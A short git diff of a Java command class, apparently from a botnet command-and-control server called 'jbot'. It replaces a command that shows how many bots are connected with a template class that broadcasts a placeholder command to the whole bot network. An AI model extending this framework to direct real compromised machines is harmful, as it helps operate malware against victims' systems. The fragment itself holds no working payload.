@@ -1,6 +1,5 @@
 package me.aaronakhtar.jbot.command_manager.commands;
 
-import me.aaronakhtar.jbot.Main;
 import me.aaronakhtar.jbot.Utilities;
 import me.aaronakhtar.jbot.command_manager.JBotCommand;
 import me.aaronakhtar.jbot.threads.handlers.ClientHandler;
@@ -8,16 +7,16 @@ import me.aaronakhtar.jbot.threads.handlers.ClientHandler;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 
-public class BotsCommand implements JBotCommand {
+public class X implements JBotCommand {
 
     @Override
     public String getCommand() {
-        return "bots";
+        return "myCommand";
     }
 
     @Override
     public String getDescription() {
-        return "view total bots connected to our network.";
+        return "use this command to send a virtual slap to all bots.";
     }
 
     @Override
@@ -27,7 +26,7 @@ public class BotsCommand implements JBotCommand {
 
     @Override
     public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {
-        out.write(Utilities.Colour.YELLOW.get() + "Total Bots Connected: "+ Utilities.Colour.MAGENTA_BG.get() + Main.connectedBots.size() + Utilities.Colour.RESET.get() + "\r\n");
-        out.flush();
+        // do something here when CNC-CLIENT executes command.
+        Utilities.executeCommandToNetwork("random command here");
     }
 }
